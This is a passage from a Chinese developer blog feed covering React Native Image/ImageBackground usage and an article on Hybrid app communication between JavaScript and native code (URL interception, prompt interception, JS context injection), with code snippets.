operator">/</span>d<span class="token operator">/</span>de<span class="token operator">/</span>Bananavarieties<span class="token punctuation">.</span>jpg'<span class="token punctuation">}</span><span class="token punctuation">}</span> style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>flex<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>width<span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">,</span> resizeMode<span class="token punctuation">:</span> Image<span class="token punctuation">.</span>resizeMode<span class="token punctuation">.</span>stretch<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>marginTop<span class="token punctuation">:</span> <span class="token number">60</span><span class="token punctuation">,</span> backgroundColor<span class="token punctuation">:</span> <span class="token string">'red'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>下面是背景图片<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>Image<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在rn版本0.46版本的时候添加了ImageBackground控件，在0.46版本以后使用Image的时候不能在嵌套使用，ImageBackground就是解决这个问题的，现在如果在 标签中嵌套其他组件现在会报黄盒警告。ImageBackground的使用和Image一样，只不过可以嵌套其他组件了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>ImageBackground    style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>newTaskHeader<span class="token punctuation">}</span>    source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./../../img/task/xsrw-bg.png"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>ntTitle<span class="token punctuation">}</span><span class="token operator">></span>积分兑换优惠券啦～<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>ntSubTitle<span class="token punctuation">}</span><span class="token operator">></span>完成任务获取积分，多重优惠券好礼不停送！<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ImageBackground<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>问题1:在iOS上Text默认的白色背景会覆盖部分图片：如下图</p><p><img src="https://img-blog.csdn.net/20180416154916973" alt="20180416154916973"></p><p>解决方法：</p><p>给ImageBackground添加一个透明背景</p><pre class="line-numbers language-js"><code class="language-js">newTaskHeader<span class="token punctuation">:</span> <span class="token punctuation">{</span>        height<span class="token punctuation">:</span> <span class="token number">115</span><span class="token punctuation">,</span>        width<span class="token punctuation">:</span> <span class="token string">"100%"</span><span class="token punctuation">,</span>        marginBottom<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>        alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">"transparent"</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决之后的效果：</p><p><img src="https://img-blog.csdn.net/20180416155415182" alt="20180416155415182"></p><p>问题2:以图片为背景时必须指定图片的大小，否则不显示</p><h2 id="Image组件的常见属性"><a href="#Image组件的常见属性" class="headerlink" title="Image组件的常见属性"></a>Image组件的常见属性</h2><h3 id="属性方法"><a href="#属性方法" class="headerlink" title="属性方法"></a>属性方法</h3><h4 id="onLayout-function"><a href="#onLayout-function" class="headerlink" title="onLayout(function)"></a>onLayout(function)</h4><p>   当Image布局发生改变的，会进行调用该方法，调用的代码为:{nativeEvent: {layout: {x, y, width, height}}}.</p><h4 id="onLoad-function"><a href="#onLoad-function" class="headerlink" title="onLoad (function)"></a>onLoad (function)</h4><p>   当图片加载成功之后，回调该方法</p><h4 id="onLoadEnd-function"><a href="#onLoadEnd-function" class="headerlink" title="onLoadEnd (function)"></a>onLoadEnd (function)</h4><p>   当图片加载失败回调该方法，该不会管图片加载成功还是失败</p><h4 id="onLoadStart-fcuntion"><a href="#onLoadStart-fcuntion" class="headerlink" title="onLoadStart (fcuntion)"></a>onLoadStart (fcuntion)</h4><p>   当图片开始加载的时候调用该方法</p><h4 id="resizeMode"><a href="#resizeMode" class="headerlink" title="resizeMode"></a>resizeMode</h4><p>   缩放比例,可选参数(‘cover’, ‘contain’, ‘stretch’) 该当图片的尺寸超过布局的尺寸的时候，会根据设置Mode进行缩放或者裁剪图片</p><p>resizeMode这样一个属性，这个属性的作用相当于OC中设置图片的内容模式。</p><p> Image.resizeMode.cover：图片居中显示，没有被拉伸，超出部分被截断；</p><p> Image.resizeMode.contain：容器完全容纳图片，图片等比例进拉伸；</p><p> Image.resizeMode.stretch： 图片被拉伸适应容器大小，有可能会发生变形。</p><p>  source{uri:string}</p><p>   进行标记图片的引用，该参数可以为一个网络url地址或者一个本地的路径</p><h3 id="样式风格属性"><a href="#样式风格属性" class="headerlink" title="样式风格属性"></a>样式风格属性</h3><p>  FlexBox  支持弹性盒子风格</p><p>  Transforms  支持属性动画</p><p>  backgroundColor 背景颜色</p><p>  borderColor     边框颜色</p><p>  borderWidth 边框宽度</p><p>  borderRadius  边框圆角</p><p>  overflow 设置图片尺寸超过容器可以设置显示或者隐藏(‘visible’,’hidden’)</p><p>  tintColor  颜色设置</p><p>  opacity 设置不透明度0.0(透明)-1.0(完全不透明)</p><p>iOS边框圆角的注意事项<br>请注意下列边框圆角样式目前在iOS的图片组件上还不支持：<br>borderTopLeftRadius<br>borderTopRightRadius<br>borderBottomLeftRadius<br>borderBottomRightRadius</p>]]></content>
      
      
      <categories>
          
          <category> ReactNative </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
            <tag> Image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hybrid通信</title>
      <link href="2017/06/14/hycommun/"/>
      <url>2017/06/14/hycommun/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信很多人都在项目里熟练使用各种Hybrid技术，无论是使用了知名得 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fmarcuswestin%2FWebViewJavascriptBridge" target="_blank" rel="noopener">WebViewJavascriptBridge</a> 框架来做自己的Hybrid Web容器，又或是自己从头着手写了一个满足自己业务需求的bridge，从而构建起自己的Hybrid Web容器，也有的干脆直接使用了<a href="https://link.juejin.im/?target=http%3A%2F%2Fcordova.axuer.com%2F" target="_blank" rel="noopener">cordova</a> 这一大型Hybrid容器框架，<a href="https://link.juejin.im/?target=http%3A%2F%2Fcordova.axuer.com%2F" target="_blank" rel="noopener">cordova</a> + <a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.ionic-china.com%2F" target="_blank" rel="noopener">ionic</a> 来进行Hybrid的开发。</p><p>拆解学习框架源码是一个好事，但是在拆解优秀框架源码的背后，如何将多个优秀源码的精华打碎重塑，结合自己的产品业务需求重新组合成为适合自己的，并且扎实掌握可以灵活修改自如控制的代码，这也算是另一个层面的提升。</p><ul><li>选择合适的JS通信方案</li><li>实现基本的JSBridge能力</li><li>尝试拓展JSBridge的额外能力</li></ul><p>这一篇先重点聊聊 JS与Native通信的通信方案</p><h2 id="几种JS-Native相互通信方式的介绍"><a href="#几种JS-Native相互通信方式的介绍" class="headerlink" title="几种JS Native相互通信方式的介绍"></a><strong>几种JS Native相互通信方式的介绍</strong></h2><p>大家可能看了很多大框架源码，无论是<a href="https://link.juejin.im/?target=http%3A%2F%2Fcordova.axuer.com%2F" target="_blank" rel="noopener">cordova</a>还是<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fmarcuswestin%2FWebViewJavascriptBridge" target="_blank" rel="noopener">WebViewJavascriptBridge</a>他们核心的通信方式就都是 <strong>假跳转请求拦截</strong></p><p>但其实JS与Native通信并不止一种方式，还有很多种通信方式，尤为重要的是，不同的通信方式有着不同的特点，有的甚至虽然受限于安卓/苹果平台差异不通用，但独有的优点却是 <strong>假跳转请求拦截</strong> 无法比拟的</p><h3 id="JS-调用-Native-的几种通信方案"><a href="#JS-调用-Native-的几种通信方案" class="headerlink" title="JS 调用 Native 的几种通信方案"></a><strong>JS 调用 Native 的几种通信方案</strong></h3><ul><li><p>假跳转的请求拦截</p></li><li><p>弹窗拦截</p><p>alert()</p><p>prompt()</p><p>confirm()</p></li><li><p>JS上下文注入</p><p>苹果JavaScriptCore注入</p><p>安卓addJavascriptInterface注入</p><p>苹果scriptMessageHandler注入</p></li></ul><h3 id="Native-调用-JS-的几种通信方案"><a href="#Native-调用-JS-的几种通信方案" class="headerlink" title="Native 调用 JS 的几种通信方案"></a><strong>Native 调用 JS 的几种通信方案</strong></h3><p>JS是一个脚本语言，在设计之初就被设计的任何时候都可以执行一段字符串js代码，换句话说，任何一个js引擎都是可以在任意时机直接执行任意的JS代码，我们可以把任何Native想要传递的消息/数据直接写进JS代码里，这样就能传递给JS了</p><ul><li>evaluatingJavaScript 直接注入执行JS代码</li></ul><p>大家在PC上用电脑，用Chrome的时候都知道，可以直接用’javascript:xxxx’来简单的执行一些JS代码，弹个框，这个方法只有安卓可以用，因为iOS必须先将url字符串生成Request再交给webview去load，这种’javascript:xxxx’生成request会失败</p><ul><li>loadUrl 浏览器用javascript:+JS代码做跳转地址  </li></ul><p>WKWebView官方提供了一个Api，可以让WebView在加载页面的时候，自动执行注入一些预先准备好的JS</p><ul><li>WKUserScript WKWebView的addUserScript方法，在加载时机注入</li></ul><h3 id="JS-调用-Native-的几种通信方案-1"><a href="#JS-调用-Native-的几种通信方案-1" class="headerlink" title="JS 调用 Native 的几种通信方案"></a><strong>JS 调用 Native 的几种通信方案</strong></h3><h3 id="假跳转的请求拦截"><a href="#假跳转的请求拦截" class="headerlink" title="假跳转的请求拦截"></a><strong>假跳转的请求拦截</strong></h3><p>何谓 假跳转的请求拦截 就是由网页发出一条新的跳转请求，跳转的目的地是一个非法的压根就不存在的地址比如</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//常规的Http地址</span>https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>wenku<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>xxxx<span class="token operator">?</span>xx<span class="token operator">=</span>xx<span class="token comment" spellcheck="true">//假的请求通信地址</span>wubacst<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>host<span class="token operator">/</span>path<span class="token operator">?</span>param<span class="token operator">=</span>paramobj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看我下面写的那条假跳转地址，这么一条什么都不是的扯淡地址，直接放到浏览器里，直接扔到webview里，肯定是妥妥的什么都打不开的，而如果在经过我们改造过的hybrid webview里，进行拦截不进行跳转</p><p>url地址分为这么几个部分</p><ul><li>协议：也就是http/https/file等，上面用了wubacst</li><li>域名：上面的 <a href="http://wenku.baidu.com/" target="_blank" rel="noopener">wenku.baidu.com</a> 和 host</li><li>路径：上面的 xxxx?或/path？</li><li>参数：上面的 xx=xx或param=paramobj</li></ul><p>如果我们构建一条假url</p><ul><li>用协议与域名当做通信识别</li><li>用路径当做指令识别</li><li>用参数当做数据传递</li></ul><p>客户端会无差别拦截所有请求，真正的url地址应该照常放过，只有协议域名匹配的url地址才应该被客户端拦截，拦截下来的url不会导致webview继续跳转错误地址，因此无感知，相反拦截下来的url我们可以读取其中路径当做指令，读取其中参数当做数据，从而根据约定调用对应的native原生代码</p><p>以上其实是一种 <strong>协议约定</strong> 只要JS侧按着这个约定协议生成假url，native按着约定协议拦截/读取假url，整个流程就能跑通。</p><p>完全可以不用按着我写的这种方式约定协议，可以任意另行约定协议比如，协议当做通信识别，域名当做模块识别，路径当做指令识别，参数当做数据传递等等，协议协议，任何一种合理的约定都可以，都可以正常的让JS与Native进行通信</p><h3 id="假跳转的请求拦截-JS发起调用"><a href="#假跳转的请求拦截-JS发起调用" class="headerlink" title="假跳转的请求拦截-JS发起调用"></a><strong>假跳转的请求拦截-JS发起调用</strong></h3><p>JS其实有很多种方式发起假请求，跟发起一个新请求没啥两样，只要按着 <strong>协议约定</strong> 生成假请求地址，正常的发起跳转即可，任何一种方式都可以让客户端拦截住</p><ul><li>A标签跳转</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//在HTML中写上A标签直接填写假请求地址</span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"wubacst: host="</span><span class="token string">" path?param="</span>paramobj<span class="token string">""</span><span class="token operator">></span>    A标签A标签A标签A标签<span class="token operator">&lt;</span><span class="token operator">/</span>a href<span class="token operator">=</span>"wubacst<span class="token punctuation">:</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>原地跳转</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//在JS中用location.href跳转</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'wubacst://host/path?param=paramobj'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>iframe跳转</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//在JS中创建一个iframe，然后插入dom之中进行跳转</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'&lt;iframe src="'</span> <span class="token operator">+</span> <span class="token string">'wubacst: host="" path?param="paramobj'</span> <span class="token operator">+</span> <span class="token string">'" style="display:none"">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe src<span class="token operator">=</span>"<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span> <span class="token operator">+</span> <span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>wubacst<span class="token punctuation">:</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>假跳转的请求拦截-客户端拦截</strong></p><ul><li>安卓的拦截方式 shouldverrideUrlLoading</li></ul><pre class="line-numbers language-js"><code class="language-js">@Overridepublic boolean <span class="token function">shouldOverrideUrlLoading</span><span class="token punctuation">(</span>WebView view<span class="token punctuation">,</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1 根据url，判断是否是所需要的拦截的调用 判断协议/域名    </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>是<span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//2 取出路径，确认要发起的native调用的指令是什么      </span>        <span class="token comment" spellcheck="true">//3 取出参数，拿到JS传过来的数据      </span>        <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据      </span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">shouldOverrideUrlLoading</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>iOS的UIWebView的拦截方式 webView:shouldStartLoadWithRequest:navigationType:</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">-</span> <span class="token punctuation">(</span>BOOL<span class="token punctuation">)</span>webView<span class="token punctuation">:</span><span class="token punctuation">(</span>UIWebView <span class="token operator">*</span><span class="token punctuation">)</span>webView shouldStartLoadWithRequest<span class="token punctuation">:</span><span class="token punctuation">(</span>NSURLRequest <span class="token operator">*</span><span class="token punctuation">)</span>request navigationType<span class="token punctuation">:</span><span class="token punctuation">(</span>UIWebViewNavigationType<span class="token punctuation">)</span>navigationType<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1 根据url，判断是否是所需要的拦截的调用 判断协议/域名    </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>是<span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//2 取出路径，确认要发起的native调用的指令是什么      </span>        <span class="token comment" spellcheck="true">//3 取出参数，拿到JS传过来的数据      </span>        <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据      </span>        <span class="token keyword">return</span> NO<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//确认拦截，拒绝WebView继续发起请求    </span>    <span class="token punctuation">}</span>            <span class="token keyword">return</span> YES<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>iOS的WKWebView的拦截方式 webView:decidePolicyForNavigationAction:decisionHandler:</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>webView<span class="token punctuation">:</span><span class="token punctuation">(</span>WKWebView <span class="token operator">*</span><span class="token punctuation">)</span>webView decidePolicyForNavigationAction<span class="token punctuation">:</span><span class="token punctuation">(</span>WKNavigationAction <span class="token operator">*</span><span class="token punctuation">)</span>navigationAction decisionHandler<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">^</span><span class="token punctuation">)</span><span class="token punctuation">(</span>WKNavigationActionPolicy<span class="token punctuation">)</span><span class="token punctuation">)</span>decisionHandler <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//1 根据url，判断是否是所需要的拦截的调用 判断协议/域名</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>是<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//2 取出路径，确认要发起的native调用的指令是什么</span>      <span class="token comment" spellcheck="true">//3 取出参数，拿到JS传过来的数据</span>      <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据</span>      <span class="token comment" spellcheck="true">//确认拦截，拒绝WebView继续发起请求</span>        <span class="token function">decisionHandler</span><span class="token punctuation">(</span>WKNavigationActionPolicyCancel<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">decisionHandler</span><span class="token punctuation">(</span>WKNavigationActionPolicyAllow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> YES<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="弹窗拦截"><a href="#弹窗拦截" class="headerlink" title="弹窗拦截"></a><strong>弹窗拦截</strong></h3><p>前端可以发起很多种弹窗包含</p><ul><li>alert() 弹出个提示框，只能点确认无回调</li><li>confirm() 弹出个确认框（确认，取消），可以回调</li><li>prompt() 弹出个输入框，让用户输入东西，可以回调</li></ul><p>每种弹框都可以由JS发出一串字符串，用于展示在弹框之上，而此字符串恰巧就是可以用来传递数据，我们把所有要传递通讯的信息，都封装进入一个js对象，然后生成字典，最后序列化成json转成字符串</p><p>通过任意一种弹框将字符串传递出来，交给客户端就可以进行拦截，从而实现通信</p><h3 id="弹窗拦截-JS发起调用"><a href="#弹窗拦截-JS发起调用" class="headerlink" title="弹窗拦截 - JS发起调用"></a><strong>弹窗拦截 - JS发起调用</strong></h3><p>其实alert/confirm/prompt三种弹框使用上没任何区别和差异，这里只取其中一种举例，可以选一个不常用的当做管道进行JS通信，这里用prompt举例</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>    action<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span>    params<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span>    callback<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> jsonData <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">[</span>data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//发起弹框</span><span class="token function">prompt</span><span class="token punctuation">(</span>jsonData<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="弹窗拦截-客户端拦截"><a href="#弹窗拦截-客户端拦截" class="headerlink" title="弹窗拦截 - 客户端拦截"></a><strong>弹窗拦截 - 客户端拦截</strong></h3><ul><li>安卓的拦截 onJsPrompt（其他的两个弹框也有）</li></ul><pre class="line-numbers language-js"><code class="language-js">@Override<span class="token keyword">public</span> boolean <span class="token function">onJsPrompt</span><span class="token punctuation">(</span>WebView view<span class="token punctuation">,</span> String url<span class="token punctuation">,</span> String message<span class="token punctuation">,</span> String defaultValue<span class="token punctuation">,</span> JsPromptResult result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//1 根据传来的字符串反解出数据，判断是否是所需要的拦截而非常规H5弹框</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>是<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//2 取出指令参数，确认要发起的native调用的指令是什么</span>      <span class="token comment" spellcheck="true">//3 取出数据参数，拿到JS传过来的数据</span>      <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onJsPrompt</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> url<span class="token punctuation">,</span> message<span class="token punctuation">,</span> defaultValue<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>iOS的WKWebView webView:runJavaScriptTextInputPanelWithPrompt:balbala</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>webView<span class="token punctuation">:</span><span class="token punctuation">(</span>WKWebView <span class="token operator">*</span><span class="token punctuation">)</span>webView runJavaScriptTextInputPanelWithPrompt<span class="token punctuation">:</span><span class="token punctuation">(</span>NSString <span class="token operator">*</span><span class="token punctuation">)</span>prompt defaultText<span class="token punctuation">:</span><span class="token punctuation">(</span>nullable NSString <span class="token operator">*</span><span class="token punctuation">)</span>defaultText initiatedByFrame<span class="token punctuation">:</span><span class="token punctuation">(</span>WKFrameInfo <span class="token operator">*</span><span class="token punctuation">)</span>frame completionHandler<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">^</span><span class="token punctuation">)</span><span class="token punctuation">(</span>NSString <span class="token operator">*</span> _Nullable result<span class="token punctuation">)</span><span class="token punctuation">)</span>completionHandler<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//1 根据传来的字符串反解出数据，判断是否是所需要的拦截而非常规H5弹框</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>是<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//2 取出指令参数，确认要发起的native调用的指令是什么</span>        <span class="token comment" spellcheck="true">//3 取出数据参数，拿到JS传过来的数据</span>        <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据</span>        <span class="token comment" spellcheck="true">//直接返回JS空字符串</span>        <span class="token function">completionHandler</span><span class="token punctuation">(</span>@<span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//直接返回JS空字符串</span>        <span class="token function">completionHandler</span><span class="token punctuation">(</span>@<span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>iOS的UIWebView</li></ul><p>UIWebView不支持截获任何一种弹框，因此这条路走不通</p><h3 id="JS上下文注入"><a href="#JS上下文注入" class="headerlink" title="JS上下文注入"></a><strong>JS上下文注入</strong></h3><p>说道JS上下文注入，做iOS的都会了解到iOS7新增的一整个JavaScriptCore这个framework，这个framework被广泛使用在了JSPatch，RN等上面，但这个东西一般用法都是完全脱离于WebView，只有一个JS上下文，这个JS上下文里，没有window对象，没有dom，严格意义上讲这个和我们所关注的依赖WebView的Hybrid框架是有很大差异的，就不在这篇文章里多说了</p><ul><li>苹果UIWebview JavaScriptCore注入</li><li>安卓addJavascriptInterface注入</li><li>苹果WKWebView scriptMessageHandler注入</li></ul><p>虽然某种意义上讲上面三种方式，他们都可以被称作JS注入，他们都有一个共同的特点就是，不通过任何拦截的办法，而是直接将一个native对象（or函数）注入到JS里面，可以由web的js代码直接调用，直接操作</p><p>但这三种注入方式都操作差异还是很大，并且各自的局限性各不相同，我们下面一一说明</p><h3 id="苹果UIWebview-JavaScriptCore注入"><a href="#苹果UIWebview-JavaScriptCore注入" class="headerlink" title="苹果UIWebview JavaScriptCore注入"></a><strong>苹果UIWebview JavaScriptCore注入</strong></h3><p>UIWebView可以通过KVC的方法，直接拿到整个WebView当前所拥有的JS上下文</p><p>documentView.webView.mainFrame.javaScriptContext</p><p>拿到了JSContext，一切的使用方式就和直接操作JavaScriptCore没啥区别了，我们可以把任何遵循JSExport协议的对象直接注入JS，让JS能够直接控制和操作</p><p>所以在介绍如何JS与Native操作的时候换个顺序，先介绍客户端如何把bridge函数注入到JS，在介绍JS如何使用</p><h3 id="苹果UIWebview-JavaScriptCore注入-客户端注入"><a href="#苹果UIWebview-JavaScriptCore注入-客户端注入" class="headerlink" title="苹果UIWebview JavaScriptCore注入 - 客户端注入"></a><strong>苹果UIWebview JavaScriptCore注入 - 客户端注入</strong></h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//拿到当前WebView的JS上下文</span>JSContext <span class="token operator">*</span>context <span class="token operator">=</span> <span class="token punctuation">[</span>webview valueForKeyPath<span class="token punctuation">:</span>@<span class="token string">"documentView.webView.mainFrame.javaScriptContext"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//给这个上下文注入callNativeFunction函数当做JS对象</span>context<span class="token punctuation">[</span>@<span class="token string">"callNativeFunction"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">^</span><span class="token punctuation">(</span> JSValue <span class="token operator">*</span> data <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//1 解读JS传过来的JSValue  data数据</span>    <span class="token comment" spellcheck="true">//2 取出指令参数，确认要发起的native调用的指令是什么</span>    <span class="token comment" spellcheck="true">//3 取出数据参数，拿到JS传过来的数据</span>    <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据</span>    <span class="token comment" spellcheck="true">//5 此时还可以将客户端的数据同步返回！</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面的方法可以拿到当前WebView的JS上下文JSContext，然后就要准备往这个JSContext里面注入准备好的block，而这个准备好的block，负责解读JS传过来的数据，从而分发调用各种native函数指令</p><blockquote><p>TIPS:</p><p>这种注入不止可以把block注入，在JS里成为一个JS函数，还可以把字符/数字/字典等数据直接注入到JS全局对象之中，可以让JS访问到Native才能获取的全局对象，甚至还可以注入任何NSObject对象，只要这个NSObject对象遵循JSExportOC的协议，相当于JS可以直接调用访问OC的内存对象</p></blockquote><h3 id="苹果UIWebview-JavaScriptCore注入-JS调用"><a href="#苹果UIWebview-JavaScriptCore注入-JS调用" class="headerlink" title="苹果UIWebview JavaScriptCore注入 - JS调用"></a><strong>苹果UIWebview JavaScriptCore注入 - JS调用</strong></h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//准备要传给native的数据，包括指令，数据，回调等</span><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>    action<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token 